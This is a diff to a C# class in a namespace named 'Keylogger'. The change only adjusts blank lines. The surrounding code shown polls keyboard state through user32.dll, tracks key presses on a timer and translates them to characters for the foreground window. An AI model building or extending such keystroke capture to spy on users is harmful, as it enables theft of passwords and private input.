@@ -14,6 +14,7 @@ namespace Keylogger
     {
         [DllImport("user32.dll")]
         static extern int GetAsyncKeyState(int key);
+        
         [DllImport("user32.dll")]
         static extern int ToUnicodeEx(uint virtualKeyCode,
             uint scanCode,
@@ -41,7 +42,9 @@ namespace Keylogger
         public delegate void KeyHandler(Keys key, string s);
         public event KeyHandler KeyDown;
         public event KeyHandler KeyUp;
+        
         Dictionary<Keys, bool> prevStatus;
+        
         public Catcher(int delay)
         {
             prevStatus = new Dictionary<Keys, bool>();
@@ -53,19 +56,23 @@ namespace Keylogger
             Delay = delay;
             timer.Elapsed += CheckKeys;
         }
+        
         public void Start()
         {
             timer.Start();
         }
+        
         public void Stop()
         {
             timer.Stop();
         }
+        
         void ChangeDelay(int delay)
         {
             this.delay = delay;
             timer.Interval = delay;
         }
+        
         public void CheckKeys(Object source, ElapsedEventArgs e)
         {
             IntPtr foregroundWindow = GetForegroundWindow();
@@ -94,7 +101,5 @@ namespace Keylogger
             ToUnicodeEx((uint)key, 0, state, sb, 256, 0, GetKeyboardLayout(foregroundWindow));
             return sb.ToString();
         }
-
-
     }
 }
